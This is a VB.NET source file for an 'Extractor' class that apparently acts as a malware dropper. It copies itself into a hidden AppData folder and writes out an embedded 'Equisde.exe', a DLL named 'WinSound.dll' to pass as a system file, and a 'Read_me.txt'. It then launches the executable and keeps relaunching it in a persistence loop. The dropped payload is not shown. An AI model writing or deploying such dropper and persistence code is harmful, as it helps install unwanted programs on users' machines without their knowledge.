Imports System.Security.Principal
Public Class Extractor
    Dim DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\EquisdeInstall"
    Dim Argumento As String
    Dim persistent As Boolean

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Argumento = Microsoft.VisualBasic.Command
        If Argumento = Nothing Then
        ElseIf Argumento = "/persistent" Then
            persistent = True
        End If
        Dim exeName As String = Application.ExecutablePath
        exeName = exeName.Remove(0, exeName.LastIndexOf("\") + 1)
        If My.Computer.FileSystem.FileExists(DIRCommons & "\" & exeName) = True Then
            My.Computer.FileSystem.DeleteFile(DIRCommons & "\" & exeName)
        End If
        My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\" & exeName)
        CommonStart()
    End Sub

    Sub CommonStart()
        Try
            If My.Computer.FileSystem.DirectoryExists(DIRCommons) = False Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Equisde.exe") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Equisde.exe")
            End If
            If My.Computer.FileSystem.FileExists(DIRCommons & "\WinSound.dll") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\WinSound.dll")
            End If
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Read_me.txt") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Read_me.txt")
            End If
            If My.Computer.FileSystem.DirectoryExists(DIRCommons) = True Then
                My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\Equisde.exe", My.Resources.Equisde, False)
                My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\WinSound.dll", My.Resources.WinSound, False)
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\Read_me.txt", My.Resources.Read_me, False)
                Threading.Thread.Sleep(150)
                Dim UsuarioActual As WindowsPrincipal = TryCast(Threading.Thread.CurrentPrincipal, WindowsPrincipal)
                If UsuarioActual.IsInRole(WindowsIdentity.GetCurrent.Owner) Then
                    persistent = True
                ElseIf UsuarioActual.IsInRole(WindowsIdentity.GetCurrent.User) Then
                    persistent = False
                End If
                StartTheFCKThing()
            End If
        Catch ex As Exception
            Console.WriteLine("[Extractor@CommonStart]Error: " & ex.Message)
            If persistent = True Then
                CommonStart()
            End If
        End Try
    End Sub

    Sub StartTheFCKThing()
        Try
            Process.Start(DIRCommons & "\Equisde.exe")
            Console.WriteLine("RUNNING EQUISDE")
        Catch ex As Exception
        End Try
        VerifyEquisdeRunning()
    End Sub

    Sub VerifyEquisdeRunning()
        Dim ProcesoLocal As Process() = Process.GetProcessesByName("Equisde")
        If ProcesoLocal.Length > 1 Then
            Console.WriteLine("IS RUNNING")
            End
        Else
            Console.WriteLine("IS NOT RUNNING, FUCK")
            If persistent = True Then
                StartTheFCKThing()
            End If
        End If
    End Sub
End Class